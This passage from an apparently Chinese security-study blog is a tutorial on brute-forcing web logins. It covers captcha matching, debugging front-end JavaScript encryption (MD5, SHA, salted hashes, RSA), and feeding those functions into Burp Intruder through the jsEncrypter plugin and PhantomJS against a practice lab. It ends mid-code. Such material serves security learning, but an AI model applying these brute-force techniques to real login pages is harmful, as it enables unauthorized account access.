对应验证码值库后，用 resquest.Session() 建立一个可保持状态的request对象，下载验证码图片后与md5库对比得出验证码值，进行登陆爆破即可。</p><h2 id="暴力破解与加密"><a href="#暴力破解与加密" class="headerlink" title="暴力破解与加密"></a>暴力破解与加密</h2><h3 id="Debug代码调试"><a href="#Debug代码调试" class="headerlink" title="Debug代码调试"></a>Debug代码调试</h3><p>Debug的意义在于发现程序错误的存在以隔离、消除等方式对错误，进行定位确定错误产生的原因，提出纠正错误的解决办法，对程序错误予以改正</p><h4 id="vscode-debug-python"><a href="#vscode-debug-python" class="headerlink" title="vscode debug python"></a>vscode debug python</h4><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><h6 id="1-安装插件python"><a href="#1-安装插件python" class="headerlink" title="1.安装插件python"></a>1.安装插件python</h6><p><img src="/2023/012220963/30.PNG" alt="30"></p><h6 id="2-配置文件"><a href="#2-配置文件" class="headerlink" title="2.配置文件"></a>2.配置文件</h6><p>vscdoe会在每个文件夹下创建一个 .vscode 的配置文件目录 ， 在其中创建 <strong>launch.json 、tasks.json</strong></p><p><img src="/2023/012220963/31.PNG" alt="31"></p><p><strong>lanuch.json</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">&#123;</span>    // 使用 IntelliSense 了解相关属性。    // 悬停以查看现有属性的描述。    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid<span class="token operator">=</span><span class="token number">830387</span>    <span class="token string">"version"</span><span class="token builtin class-name">:</span> <span class="token string">"0.2.0"</span>,    <span class="token string">"configurations"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>       <span class="token punctuation">&#123;</span>            <span class="token string">"name"</span><span class="token builtin class-name">:</span> <span class="token string">"Python"</span>,            <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"python"</span>,            <span class="token string">"request"</span><span class="token builtin class-name">:</span> <span class="token string">"launch"</span>,            <span class="token string">"stopOnEntry"</span><span class="token builtin class-name">:</span> false,            <span class="token string">"python"</span><span class="token builtin class-name">:</span> <span class="token string">"D:<span class="token entity" title="\\">\\</span>python<span class="token entity" title="\\">\\</span>python<span class="token entity" title="\\">\\</span>python.exe"</span>, // 替换为自己的python.exe路径            <span class="token string">"program"</span><span class="token builtin class-name">:</span> <span class="token string">"<span class="token variable">$&#123;file&#125;</span>"</span>,            <span class="token string">"cwd"</span><span class="token builtin class-name">:</span> <span class="token string">"<span class="token variable">$&#123;workspaceRoot&#125;</span>"</span>,            <span class="token string">"env"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>,            <span class="token string">"envFile"</span><span class="token builtin class-name">:</span> <span class="token string">"<span class="token variable">$&#123;workspaceRoot&#125;</span>/.env"</span>,            <span class="token string">"redirectOutput"</span><span class="token builtin class-name">:</span> true,       <span class="token punctuation">&#125;</span>   <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>tasks.json</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">&#123;</span>    <span class="token string">"version"</span><span class="token builtin class-name">:</span> <span class="token string">"2.0.0"</span>,    <span class="token string">"tasks"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>       <span class="token punctuation">&#123;</span>            <span class="token string">"label"</span><span class="token builtin class-name">:</span> <span class="token string">"python"</span>,            <span class="token string">"type"</span><span class="token builtin class-name">:</span> <span class="token string">"shell"</span>,            <span class="token string">"command"</span><span class="token builtin class-name">:</span> <span class="token string">"D:<span class="token entity" title="\\">\\</span>python<span class="token entity" title="\\">\\</span>python<span class="token entity" title="\\">\\</span>python.exe"</span>, // 替换为自己的python.exe路径            <span class="token string">"args"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                <span class="token string">"<span class="token variable">$&#123;file&#125;</span>"</span>           <span class="token punctuation">]</span>,            <span class="token string">"group"</span><span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"kind"</span><span class="token builtin class-name">:</span> <span class="token string">"build"</span>,                <span class="token string">"isDefault"</span><span class="token builtin class-name">:</span> <span class="token boolean">true</span>           <span class="token punctuation">&#125;</span>,            <span class="token string">"problemMatcher"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>                <span class="token string">"<span class="token variable">$eslint</span>-compact"</span>           <span class="token punctuation">]</span>       <span class="token punctuation">&#125;</span>   <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="修改python解释器"><a href="#修改python解释器" class="headerlink" title="修改python解释器"></a>修改python解释器</h6><p>vscode中Ctrl+shirt+p调出查询窗口，输入python:select选择python解释器</p><p><img src="/2023/012220963/32.PNG" alt="32"></p><h5 id="Debug-Start"><a href="#Debug-Start" class="headerlink" title="Debug Start"></a>Debug Start</h5><p>使用debug模式启动程序代码</p><p><img src="/2023/012220963/33.PNG" alt="33"></p><h6 id="1-下断点debug"><a href="#1-下断点debug" class="headerlink" title="1.下断点debug"></a>1.下断点debug</h6><p>在想要调试的代码处下断点，程序debug运行后会停在此行代码执行前，等待用户调试。</p><h6 id="2-调试选项"><a href="#2-调试选项" class="headerlink" title="2.调试选项"></a>2.调试选项</h6><p><strong>继续</strong>：继续执行程序，直到遇到下一个断点为止</p><p><strong>单步跳过</strong>：在普通代码行运行时，会逐行运行程序。若遇到调用自定义函数命令，且在该定义的函数里没有断点，则直接运行完该函数，不会进入该函数并逐行运行该函数内的代码</p><p><strong>单步调试</strong>：逐行顺序运行程序。若遇到自定义函数（def），则进入该函数，逐行运行该函数内的代码</p><p><strong>单步跳出</strong>：当前运行在自定义函数（def）里时，如果在该自定义函数里没有断点，则会直接运行完当前自定义函数，停在调用函数的那一行</p><p><strong>重启</strong>：重新启动debug程序</p><p><strong>停止</strong>：结束程序</p><h6 id="3-变量监视"><a href="#3-变量监视" class="headerlink" title="3.变量监视"></a>3.变量监视</h6><p>一般在不进行 debug 时会使用print打印某个变量的值，debug可以很轻松的监视每个变量的值。</p><p><img src="/2023/012220963/34.png" alt="34"></p><h3 id="前端加密爆破"><a href="#前端加密爆破" class="headerlink" title="前端加密爆破"></a>前端加密爆破</h3><p>在我们渗透过程在，经常会发现没有验证码，也没有登录次数限制，但是用户名密码都是加密的，如果只是md5加密或者hash，burp的Intruder模块自带加密爆破功能，但是如果是自定义的加密方式，或者多层md5此时就没法直接爆破了。这种情况都是前端调用 javascript代码对提交内容进行了加密，通过代码调试可以找到加密函数，使用与其相同的加密函数处理数据提交即可。</p><h4 id="常见前端加密"><a href="#常见前端加密" class="headerlink" title="常见前端加密"></a>常见前端加密</h4><h5 id="base64加密与解密"><a href="#base64加密与解密" class="headerlink" title="base64加密与解密"></a>base64加密与解密</h5><p>window.atob() 与window.btoa()可以实现对base64格式的数据进行解码和编码，其兼容性是主流浏览器，IE10及以上。</p><p>window.atob(encodedStr)只可以解码用btoa方法编码的字符串。</p><p>window.btoa()：将ascii字符串或二进制数据转换成一个base64编码过的字符串,但该方法不能直接作用于Unicode字符串。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script<span class="token operator">></span>      var str <span class="token operator">=</span> <span class="token string">'RUNOOB'</span>      var enc <span class="token operator">=</span> window.btoa<span class="token punctuation">(</span>str<span class="token punctuation">)</span> //编码成base64的      var dec <span class="token operator">=</span> window.atob<span class="token punctuation">(</span>enc<span class="token punctuation">)</span> //把base64解码      var res <span class="token operator">=</span> <span class="token string">'编码字符串为: '</span> + enc + <span class="token string">'&lt;br>'</span> + <span class="token string">'解码后字符串为: '</span> + dec      console.log<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当遇到中文时，需要先对中文转码否则会乱码。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var str <span class="token operator">=</span> btoa<span class="token punctuation">(</span>encodeURIComponent<span class="token punctuation">(</span><span class="token string">"中文汉字"</span><span class="token punctuation">))</span><span class="token punctuation">;</span>//还可以解码回来decodeURIComponent<span class="token punctuation">(</span>atob<span class="token punctuation">(</span>enc<span class="token punctuation">))</span> <span class="token operator">=</span><span class="token operator">></span>  中文汉字<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="MD5加密"><a href="#MD5加密" class="headerlink" title="MD5加密"></a>MD5加密</h5><p>首先引入相关js,对要加密的内容直接加密</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>  var b <span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>"#logPassword"<span class="token variable">)</span></span><span class="token punctuation">;</span>  $.md5<span class="token punctuation">(</span>b.val<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>MD5没有解密算法，或者说解密算法很复杂，所以可以在数据库中存放经过<strong>两次MD5</strong>加密的的内容，也可以再配合加‘盐’ salt</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">console.log<span class="token punctuation">(</span>md5<span class="token punctuation">(</span>md5<span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span> + <span class="token string">"a"</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="sha1加密"><a href="#sha1加密" class="headerlink" title="sha1加密"></a>sha1加密</h5><p>首先引入相关js,对要加密的内容直接加密</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text/ecmascript"</span> <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"sha1.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span>var sha <span class="token operator">=</span> hex_sha1<span class="token punctuation">(</span><span class="token string">'mima123465'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console.log<span class="token punctuation">(</span>sha<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="RSA用公钥私钥加密解密"><a href="#RSA用公钥私钥加密解密" class="headerlink" title="RSA用公钥私钥加密解密"></a>RSA用公钥私钥加密解密</h5><p>首先引入相关配置文件</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"js/jsencrypt.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>前端在向后台发起登录请求之前，先请求后台获取公钥的方法</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">var publicKey <span class="token operator">=</span> null<span class="token punctuation">;</span>$.ajax<span class="token punctuation">(</span><span class="token punctuation">&#123;</span> url: <span class="token string">"xxx"</span>, type: <span class="token string">"post"</span>, dataType: <span class="token string">"text"</span>, success: function<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> var encrypt <span class="token operator">=</span> new JSEncrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> if<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> publicKey <span class="token operator">=</span> data<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>// 通过公钥对用户名和密码加密encrypt.setPublicKey<span class="token punctuation">(</span>publicKey<span class="token punctuation">)</span><span class="token punctuation">;</span>var username<span class="token punctuation">;</span>var password<span class="token punctuation">;</span>username <span class="token operator">=</span> encrypt.encrypt<span class="token punctuation">(</span>vm.username.trim<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>password <span class="token operator">=</span> encrypt.encrypt<span class="token punctuation">(</span>vm.password.trim<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>// 接下来就是用加密后的用户名密码请求后台$.ajax<span class="token punctuation">(</span><span class="token punctuation">&#123;</span> type: <span class="token string">"POST"</span>, url: <span class="token string">"xxxxxx"</span>, data: <span class="token punctuation">&#123;</span>   <span class="token string">"username"</span>:username, <span class="token string">"password"</span>:password, <span class="token punctuation">&#125;</span>,   dataType: <span class="token string">"json"</span>,   success: <span class="token keyword">function</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>result.code <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>//登录成功 parent.location.href <span class="token operator">=</span> <span class="token string">'index.html'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> vm.error <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>   vm.errorMsg <span class="token operator">=</span> result.msg<span class="token punctuation">;</span> vm.refreshCode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="练习靶场"><a href="#练习靶场" class="headerlink" title="练习靶场"></a>练习靶场</h4><p><strong>待补充</strong></p><h4 id="浏览器调试前端代码"><a href="#浏览器调试前端代码" class="headerlink" title="浏览器调试前端代码"></a>浏览器调试前端代码</h4><h5 id="找加密函数"><a href="#找加密函数" class="headerlink" title="找加密函数"></a>找加密函数</h5><p>通过查看源码，审查元素等方式找到加密数据的函数</p><p><strong>打开浏览器调试</strong></p><p><strong>找到加密函数</strong></p><h5 id="打断点debug"><a href="#打断点debug" class="headerlink" title="打断点debug"></a>打断点debug</h5><p>断点的位置很有考究，调试的代码越少越利于我们分析，根据经验尽量精准的选择代码</p><h5 id="触发加密函数"><a href="#触发加密函数" class="headerlink" title="触发加密函数"></a>触发加密函数</h5><p>一般来说，点击登陆即可触发加密函数，点击登陆后代码暂停在了断点处</p><h5 id="调试（继续、单步、步进、步出）"><a href="#调试（继续、单步、步进、步出）" class="headerlink" title="调试（继续、单步、步进、步出）"></a>调试（继续、单步、步进、步出）</h5><p>单步（Step into next function call）进入当前函数，一步步执行</p><p>步进（Step into next function call）如果在一个函数处步进，可以进入该函数</p><p>步出（Step out of current function）如果在一个调用函数中，从此函数退出，回到调用该函数的地方</p><p>跨越 (Step over next function call) 执行到下一步的函数调用（跳到下一行）</p><h5 id="监视表达式"><a href="#监视表达式" class="headerlink" title="监视表达式"></a>监视表达式</h5><h5 id="下载js加密文件"><a href="#下载js加密文件" class="headerlink" title="下载js加密文件"></a>下载js加密文件</h5><h5 id="还原JS加密文件"><a href="#还原JS加密文件" class="headerlink" title="还原JS加密文件"></a>还原JS加密文件</h5><h5 id="burp插件jsEncrypter"><a href="#burp插件jsEncrypter" class="headerlink" title="burp插件jsEncrypter"></a>burp插件jsEncrypter</h5><p>加密函数已经在本地实现了，先在讲加密函数和burp联动起来</p><h6 id="1-安装phantomjs"><a href="#1-安装phantomjs" class="headerlink" title="1.安装phantomjs"></a>1.安装phantomjs</h6><p><strong>简介</strong>：PhantomJS是一个基于webkit的JavaScript API。它使用QtWebKit作为它核心浏览器的功能，使用webkit来编译解释执行JavaScript代码。任何你可以在基于webkit浏览器做的事情，它都能做到。它不仅是个隐形的浏览器，提供了诸如CSS选择器、支持Web标准、DOM操作、JSON、HTML5、</p><p>Canvas、SVG等，同时也提供了处理文件I/O的操作，从而使你可以向操作系</p><p>统读写文件等。PhantomJS的用处可谓非常广泛，诸如网络监测、网页截</p><p>屏、无需浏览器的 Web 测试、页面访问自动化等</p><p><strong>配置：</strong>下载 <a href="https://phantomjs.org/download.html">phantomjs</a>将 bin 目录<strong>添加至环境变量</strong>即可</p><p><img src="/2023/012220963/36.PNG" alt="36"></p><h6 id="2-安装jsEncrypter"><a href="#2-安装jsEncrypter" class="headerlink" title="2.安装jsEncrypter"></a>2.安装jsEncrypter</h6><p> <a href="https://github.com/c0ny1/jsEncrypter/releases">下载jsEncrypter</a></p><h6 id="3-burp导入插件jsEncrypter"><a href="#3-burp导入插件jsEncrypter" class="headerlink" title="3.burp导入插件jsEncrypter"></a>3.burp导入插件jsEncrypter</h6><p><img src="/2023/012220963/37.png" alt="37"></p><h6 id="4-安装靶场webapp"><a href="#4-安装靶场webapp" class="headerlink" title="4.安装靶场webapp"></a>4.安装靶场webapp</h6><p>将靶场文件放在 WWW 目录下即可</p><h5 id="burp调用js加密函数"><a href="#burp调用js加密函数" class="headerlink" title="burp调用js加密函数"></a>burp调用js加密函数</h5><p><strong>1.修改 phantomjs_server.js文件，导入js加密函数</strong></p><p><strong>2.加入自定义js函数改写后</strong></p><p><img src="/2023/012220963/217.PNG" alt=" "></p><p><strong>3.启动phantomjs</strong></p><p>在jsEncrypter.0.3.2文件夹进行cmd</p><p>命令： phantomjs phantomjs_server.js</p><p><img src="/2023/012220963/218.PNG" alt=" "></p><p>或者</p><p><img src="/2023/012220963/221.PNG" alt=" "></p><p><strong>4.burp</strong> <strong>插件连接</strong> <strong>phantomjs</strong></p><p>插件点击 connect 连接到 phantomjs ，并进行加密函数调用测试</p><p><img src="/2023/012220963/219.PNG" alt=" "></p><p><strong>5.开始爆破</strong></p><p><img src="/2023/012220963/220.PNG" alt=" "></p><h3 id="JS加密靶场练习"><a href="#JS加密靶场练习" class="headerlink" title="JS加密靶场练习"></a>JS加密靶场练习</h3><h4 id="哈希算法"><a href="#哈希算法" class="headerlink" title="哈希算法"></a>哈希算法</h4><p>哈希算法（Hash Algorithms）也称为散列算法、杂凑算法或数字指纹，是可以将任意长度的消息压缩为一个固定长度的消息的算法。</p><p>哈希算法是区块链技术体系的重要组成部分，也是现代密码学领域的重要分支，在身份认证、数字签名等诸多领域有着广泛的应用。</p><p>密码学哈希算法的主要特性就是<strong>单向性</strong>，即在算法上，<strong>只能从输入值计算得到输出值</strong>，而从输出值计算得到输入值是不可行的。</p><p>常用的哈希算法包括MD系列算法和SHA系列算法，其中MD系列算法有MD2、MD4、MD5、RIPEMD算法等，SHA系列算法有SHA0、SHA1、SHA2、SHA3算法等</p><h5 id="密码解密网站"><a href="#密码解密网站" class="headerlink" title="密码解密网站"></a>密码解密网站</h5><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a> 、 <a href="https://www.somd5.com/">https://www.somd5.com/</a> 、<a href="https://pmd5.com/">https://pmd5.com/</a></p><h5 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h5><p>MD5信息摘要算法，一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。通常为为 <strong>32</strong> <strong>位十六进制字符</strong>，16位MD5值是 32位MD5的前16位。</p><p><strong>test.html</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"./md5.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    var password <span class="token operator">=</span> String<span class="token punctuation">(</span><span class="token string">"123456"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> // 注意，这里是字符串    var en_password <span class="token operator">=</span> hex_md5<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    console.log<span class="token punctuation">(</span>en_password<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>phantomjs_server.js</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">// 加载实现加密算法的js脚本var wasSuccessful <span class="token operator">=</span> phantom.injectJs<span class="token punctuation">(</span><span class="token string">'md5.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> /*引入实现加密的js文件*/// 处理函数<span class="token keyword">function</span> js_encrypt<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    var newpayload<span class="token punctuation">;</span>    /**********在这里编写调用加密函数进行加密的代码************/    var password <span class="token operator">=</span> String<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    var en_password <span class="token operator">=</span> hex_md5<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    newpayload <span class="token operator">=</span> en_password        /**********************************************************/    <span class="token builtin class-name">return</span> newpayload<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="SHA家族名称"><a href="#SHA家族名称" class="headerlink" title="SHA家族名称"></a>SHA家族名称</h5><p>计算机名词发音网站：<a href="http://www.howtopronounce.cc/sha1">http://www.howtopronounce.cc/sha1</a></p><p><img src="/2023/012220963/35.png" alt="35"></p><h5 id="SHA1"><a href="#SHA1" class="headerlink" title="SHA1"></a>SHA1</h5><p>SHA-1 是最广泛使用和设置的加密哈希函数之一，SSL 证书颁发机构经常使用它来签署证书。SHA-1 是一个 160 位散列，它接受一个输入并生成一个 160 位（20 字节）的散列值，称为消息摘要。它通常由一个 <strong>40</strong> <strong>位长的十六进制字符</strong>串描述。</p><h5 id="SHA256"><a href="#SHA256" class="headerlink" title="SHA256"></a>SHA256</h5><p>SHA256算法使用的哈希值长度是256位。这是一个抽象类，此类的唯一实现是<em>SHA256</em>Managed。对于任意长度的消息，SHA256都会产生一个256bit长度的散列值，称为消息摘要，可以用一个<strong>长度为64</strong>的十六进制字符串**表示</p><h5 id="SHA384"><a href="#SHA384" class="headerlink" title="SHA384"></a>SHA384</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>96</strong></strong>的十六进制</strong>字符串表示</p><h5 id="SHA512"><a href="#SHA512" class="headerlink" title="SHA512"></a>SHA512</h5><p>SHA384是其中比较常见的一种摘要算法，可以用一个<strong>长度为<strong><strong>128</strong></strong>的十六进制</strong>字符串表示</p><h4 id="密码加盐（Salt）"><a href="#密码加盐（Salt）" class="headerlink" title="密码加盐（Salt）"></a>密码加盐（Salt）</h4><p>原始密码加密后的哈希值存储在数据库中依然是不够安全的，那么有什么好的办法来解决这个问题呢？答案是加盐。盐（Salt）是什么？就是一个随机生成的字符串。我们将盐与原始密码连接（concat）在一起（放在前面或后面都可以），然后将concat后的字符串加密。采用这种方式加密密码，查表法就不灵了（因为盐是随机生成的）。</p><h5 id="加盐练习"><a href="#加盐练习" class="headerlink" title="加盐练习"></a>加盐练习</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5<span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123456"</span>    <span class="token comment"># --post传入的参数</span>salt <span class="token operator">=</span> <span class="token string">"salt123"</span><span class="token keyword">def</span> <span class="token function">q</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pass1 <span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> pass1<span class="token keyword">def</span> <span class="token function">w</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    m<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token punctuation">(</span>q<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> salt<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 盐可以加在任何位置</span>    pass2 <span class="token operator">=</span> m<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> pass2<span class="token keyword">print</span><span class="token punctuation">(</span>w<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><strong>RSA****是一种非对称加密算法</strong>，加密算法分为对称加密算法和非对称加密算法,其中非对称加密算法作为计算机通信安全的基石,在保证数据安全方面起着重要的作用。</p><p><strong>非对称加密</strong>(公钥加密)：指加密和解密使用不同密钥的加密算法，也称为<strong>公私钥加密</strong>。假设两个用户要加密交换数据，双方交换公钥，使用时一方用对方的<strong>公钥加密</strong>，另一方即可用自己的<strong>私钥解密</strong>。</p><h5 id="找公钥"><a href="#找公钥" class="headerlink" title="找公钥"></a>找公钥</h5><p>公钥是公开的，因为公钥只能用来加密，不能用来解密，所以公钥在网站的前端代码里能够找到</p><h5 id="编写加密函数"><a href="#编写加密函数" class="headerlink" title="编写加密函数"></a>编写加密函数</h5><p><strong>rsa.html</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token operator">&lt;</span>script <span class="token assign-left variable">src</span><span class="token operator">=</span><span class="token string">"./jsencrypt.js"</span><span class="token operator">></span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span>    var public_key <span class="token operator">=</span><span class="token string">"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP/38Fw8QQXBfROCgzGc+Te6pOPl6Ye+vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgInMSDiMsggTWxcI/Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB"</span><span class="token punctuation">;</span>    var password <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token punctuation">;</span>    var encrypt <span class="token operator">=</span> new JSEncrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    encrypt.setPublicKey<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    en_password <span class="token operator">=</span> encrypt.encrypt<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    console.log<span class="token punctuation">(</span>en_password<span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>phantomjs_server.js</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span> 加载实现加密算法的js脚本var wasSuccessful <span class="token operator">=</span> phantom<span class="token punctuation">.</span>injectJs<span class="token punctuation">(</span><span class="token string">'jsencrypt.js'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">*</span>引入实现加密的js文件<span class="token operator">*</span><span class="token operator">/</span><span class="token operator">//</span> 处理函数function js_encrypt<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    var newpayload<span class="token punctuation">;</span>    <span class="token operator">/</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span>在这里编写调用加密函数进行加密的代码<span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">/</span>    var public_key <span class="token operator">=</span>"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC0Llg1bVZhnyslfezwfeOkvnXWq59bDtmQyHvxkP<span class="token operator">/</span>38Fw8QQXBfROCgzGc<span class="token operator">+</span>Te6pOPl6Ye<span class="token 